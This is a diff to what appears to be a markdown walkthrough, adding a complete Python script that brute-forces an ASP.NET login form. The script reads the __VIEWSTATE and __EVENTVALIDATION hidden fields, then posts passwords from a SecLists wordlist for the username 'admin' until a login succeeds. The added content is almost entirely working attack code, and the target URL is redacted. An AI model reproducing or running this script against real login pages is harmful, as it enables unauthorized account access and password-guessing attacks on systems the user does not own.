@@ -58,3 +58,57 @@ eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})['value']
 
 ## 5. Reading the Password Wordlist
 - Will write the script on YouTube
+
+```
+#!/usr/bin/env python3
+
+import requests
+from bs4 import BeautifulSoup
+import logging
+
+logging.basicConfig(level=logging.INFO)
+
+# Target URL
+url = "redacted"
+session = requests.Session()
+
+logging.info("Fetching the login page...")
+response = session.get(url)
+soup = BeautifulSoup(response.content, 'html.parser')
+
+# Extract hidden fields
+viewstate = soup.find("input", {"id": "__VIEWSTATE"})['value']
+eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})['value']
+
+# Wordlist from SecLists
+wordlist_file = "redacted"
+
+try:
+    with open(wordlist_file, "r") as f:
+        passwords = f.readlines()
+except FileNotFoundError:
+    logging.error("Wordlist file not found.")
+    exit()
+
+# Brute-forcing
+username = "admin"
+for password in passwords:
+    password = password.strip()
+    logging.info(f"Trying password: {password}")
+
+    payload = {
+        "__VIEWSTATE": viewstate,
+        "__EVENTVALIDATION": eventvalidation,
+        "ctl00$MainContent$LoginUser$UserName": username,
+        "ctl00$MainContent$LoginUser$Password": password,
+        "ctl00$MainContent$LoginUser$LoginButton": "Log in"
+    }
+
+    login_response = session.post(url, data=payload)
+    if "Invalid login" not in login_response.text:
+        logging.info(f"Login successful! Username: {username}, Password: {password}")
+        print(f"Correct password: {password}")
+        break
+else:
+    logging.info("Password not found in the wordlist.")
+
